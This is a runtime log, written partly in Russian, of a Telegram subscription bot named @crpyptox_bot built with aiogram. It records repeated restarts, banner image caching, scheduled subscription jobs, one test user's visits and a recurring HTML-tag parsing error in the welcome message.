2026-05-20 20:46:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 20:46:06 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 20:46:06 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-20 20:46:06 | INFO     | __main__ | Запуск polling...
2026-05-20 20:46:06 | INFO     | database.db | База данных инициализирована
2026-05-20 20:46:06 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-20 20:46:06 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-20 20:46:06 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-20 20:46:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-20 20:46:06 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-20 20:46:06 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-20 20:46:07 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-20 20:46:07 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-20 20:46:07 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-20 20:46:07 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-20 20:46:07 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-20 20:46:08 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-20 20:46:08 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-20 21:10:55 | INFO     | __main__ | Запуск бота...
2026-05-20 21:10:55 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 21:10:55 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 21:10:55 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-20 21:10:55 | INFO     | __main__ | Запуск polling...
2026-05-20 21:10:55 | INFO     | database.db | База данных инициализирована
2026-05-20 21:10:55 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-20 21:10:55 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-20 21:10:55 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-20 21:10:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-20 21:10:55 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-20 21:10:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-20 21:10:56 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-20 21:10:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-20 21:10:56 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-20 21:10:56 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-20 21:10:57 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-20 21:10:57 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-20 21:11:09 | ERROR    | aiogram.event | Cause exception while process update id=744857636 by bot id=7959085819
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 687, expected "</b>", found "</i>"
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 88, in back_to_start
    await send_welcome(bot, callback.from_user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 37, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 687, expected "</b>", found "</i>"
2026-05-20 21:11:12 | ERROR    | aiogram.event | Cause exception while process update id=744857637 by bot id=7959085819
TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 687, expected "</b>", found "</i>"
Traceback (most recent call last):
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\error.py", line 25, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\middlewares\user_context.py", line 49, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\fsm\middleware.py", line 42, in __call__
    return await handler(event, data)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\python310\lib\site-packages\aiogram\dispatcher\dispatcher.py", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 170, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 142, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 137, in _wrapped
    return await self._propagate_event(
  File "C:\python310\lib\site-packages\aiogram\dispatcher\router.py", line 162, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\telegram.py", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File "C:\python310\lib\site-packages\aiogram\dispatcher\event\handler.py", line 43, in call
    return await wrapped()
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 79, in cmd_start
    await send_welcome(bot, user.id)
  File "C:\Users\Nikta\Desktop\bot\handlers\start.py", line 37, in send_welcome
    msg = await bot.send_photo(
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 2978, in send_photo
    return await self(call, request_timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\bot.py", line 485, in __call__
    return await self.session(self, method, timeout=request_timeout)
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 254, in __call__
    return cast(TelegramType, await middleware(bot, method))
  File "C:\python310\lib\site-packages\aiogram\client\session\aiohttp.py", line 189, in make_request
    response = self.check_response(
  File "C:\python310\lib\site-packages\aiogram\client\session\base.py", line 120, in check_response
    raise TelegramBadRequest(method=method, message=description)
aiogram.exceptions.TelegramBadRequest: Telegram server says - Bad Request: can't parse entities: Unmatched end tag at byte offset 687, expected "</b>", found "</i>"
2026-05-20 21:12:56 | INFO     | __main__ | Запуск бота...
2026-05-20 21:12:56 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 21:12:56 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-20 21:12:56 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-20 21:12:56 | INFO     | __main__ | Запуск polling...
2026-05-20 21:12:56 | INFO     | database.db | База данных инициализирована
2026-05-20 21:12:56 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-20 21:12:56 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-20 21:12:56 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-20 21:12:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-20 21:12:56 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-20 21:12:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-20 21:12:57 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-20 21:12:57 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-20 21:12:58 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-20 21:12:58 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-20 21:12:58 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-20 21:12:58 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-20 21:12:59 | INFO     | handlers.start | Пользователь 733970441 (volner7) запустил бота
2026-05-21 20:23:22 | INFO     | __main__ | Запуск бота...
2026-05-21 20:23:22 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:23:22 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:23:22 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:23:22 | INFO     | __main__ | Запуск polling...
2026-05-21 20:23:22 | INFO     | database.db | База данных инициализирована
2026-05-21 20:23:22 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:23:22 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:23:22 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:23:22 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:23:24 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:23:24 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:23:25 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:23:25 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:23:26 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:23:26 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:23:26 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:23:26 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:39:44 | INFO     | __main__ | Запуск бота...
2026-05-21 20:39:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:39:44 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:39:44 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:39:44 | INFO     | __main__ | Запуск polling...
2026-05-21 20:39:44 | INFO     | database.db | База данных инициализирована
2026-05-21 20:39:44 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:39:44 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:39:44 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:39:44 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:39:45 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:39:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:39:45 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:39:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:39:46 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:39:46 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:39:46 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:39:46 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:39:56 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-21 20:40:31 | INFO     | __main__ | Запуск бота...
2026-05-21 20:40:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:40:31 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:40:31 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:40:31 | INFO     | __main__ | Запуск polling...
2026-05-21 20:40:31 | INFO     | database.db | База данных инициализирована
2026-05-21 20:40:31 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:40:31 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:40:31 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:40:31 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:40:33 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:40:33 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:40:33 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:40:33 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:40:34 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:40:34 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:40:34 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:40:34 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:40:39 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 20:49:53 | INFO     | __main__ | Запуск бота...
2026-05-21 20:49:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:49:53 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:49:53 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:49:53 | INFO     | __main__ | Запуск polling...
2026-05-21 20:49:54 | INFO     | database.db | База данных инициализирована
2026-05-21 20:49:54 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:49:54 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:49:54 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:49:54 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:49:55 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:49:55 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:49:56 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:49:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:49:56 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:49:56 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:49:57 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:49:57 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:50:05 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 20:51:20 | INFO     | __main__ | Запуск бота...
2026-05-21 20:51:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:51:20 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:51:20 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:51:20 | INFO     | __main__ | Запуск polling...
2026-05-21 20:51:20 | INFO     | database.db | База данных инициализирована
2026-05-21 20:51:20 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:51:20 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:51:20 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:51:20 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:51:21 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:51:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:51:21 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:51:21 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:51:22 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:51:22 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:51:22 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:51:22 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:51:27 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 20:53:10 | INFO     | __main__ | Запуск бота...
2026-05-21 20:53:10 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:53:10 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:53:10 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:53:10 | INFO     | __main__ | Запуск polling...
2026-05-21 20:53:11 | INFO     | database.db | База данных инициализирована
2026-05-21 20:53:11 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:53:11 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:53:11 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:53:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:53:11 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:53:11 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:53:12 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:53:12 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:53:12 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:53:12 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:53:13 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:53:13 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:53:15 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 20:55:50 | INFO     | __main__ | Запуск бота...
2026-05-21 20:55:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:55:50 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 20:55:50 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 20:55:50 | INFO     | __main__ | Запуск polling...
2026-05-21 20:55:50 | INFO     | database.db | База данных инициализирована
2026-05-21 20:55:50 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 20:55:50 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 20:55:50 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 20:55:50 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 20:55:51 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 20:55:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 20:55:51 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 20:55:51 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 20:55:52 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 20:55:52 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 20:55:52 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 20:55:52 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 20:56:00 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 20:57:27 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-21 21:08:01 | INFO     | handlers.start | Возврат пользователь 733970441 (@volner7)
2026-05-21 21:10:56 | INFO     | __main__ | Запуск бота...
2026-05-21 21:10:56 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:10:56 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:10:56 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 21:10:56 | INFO     | __main__ | Запуск polling...
2026-05-21 21:10:56 | INFO     | database.db | База данных инициализирована
2026-05-21 21:10:56 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 21:10:56 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 21:10:56 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 21:10:56 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 21:10:57 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAPPagyu...
2026-05-21 21:10:57 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 21:10:58 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 21:10:58 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 21:10:58 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 21:10:58 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 21:10:58 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 21:10:59 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 21:11:00 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 21:23:45 | INFO     | __main__ | Запуск бота...
2026-05-21 21:23:45 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:23:45 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:23:45 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 21:23:45 | INFO     | __main__ | Запуск polling...
2026-05-21 21:23:45 | INFO     | database.db | База данных инициализирована
2026-05-21 21:23:45 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 21:23:45 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 21:23:45 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 21:23:45 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 21:23:47 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBk2oP...
2026-05-21 21:23:47 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 21:23:47 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 21:23:47 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 21:23:48 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
2026-05-21 21:23:48 | INFO     | utils.photo_cache | Кэш баннеров прогрет
2026-05-21 21:23:48 | INFO     | __main__ | Канал найден: cryptovip (id=-1003927843348)
2026-05-21 21:23:48 | INFO     | __main__ | Бот запущен: @crpyptox_bot (id=7959085819)
2026-05-21 21:24:03 | INFO     | handlers.start | Новый пользователь 733970441 (@volner7)
2026-05-21 21:28:00 | INFO     | __main__ | Запуск бота...
2026-05-21 21:28:00 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:28:00 | INFO     | apscheduler.scheduler | Adding job tentatively -- it will be properly scheduled when the scheduler starts
2026-05-21 21:28:00 | INFO     | scheduler.tasks | Планировщик задач настроен
2026-05-21 21:28:00 | INFO     | __main__ | Запуск polling...
2026-05-21 21:28:00 | INFO     | database.db | База данных инициализирована
2026-05-21 21:28:00 | INFO     | apscheduler.scheduler | Added job "check_expired_subscriptions" to job store "default"
2026-05-21 21:28:00 | INFO     | apscheduler.scheduler | Added job "send_subscription_reminders" to job store "default"
2026-05-21 21:28:00 | INFO     | apscheduler.scheduler | Scheduler started
2026-05-21 21:28:00 | INFO     | utils.photo_cache | Кэширую file_id для assets/welcome.jpg...
2026-05-21 21:28:01 | INFO     | utils.photo_cache | file_id закэширован для assets/welcome.jpg: AgACAgIAAxkDAAIBmGoP...
2026-05-21 21:28:01 | INFO     | utils.photo_cache | Кэширую file_id для assets/tariffs.jpg...
2026-05-21 21:28:02 | INFO     | utils.photo_cache | file_id закэширован для assets/tariffs.jpg: AgACAgIAAxkDAAPQagyu...
2026-05-21 21:28:02 | INFO     | utils.photo_cache | Кэширую file_id для assets/payment.jpg...
2026-05-21 21:28:02 | INFO     | utils.photo_cache | file_id закэширован для assets/payment.jpg: AgACAgIAAxkDAAPRagyu...
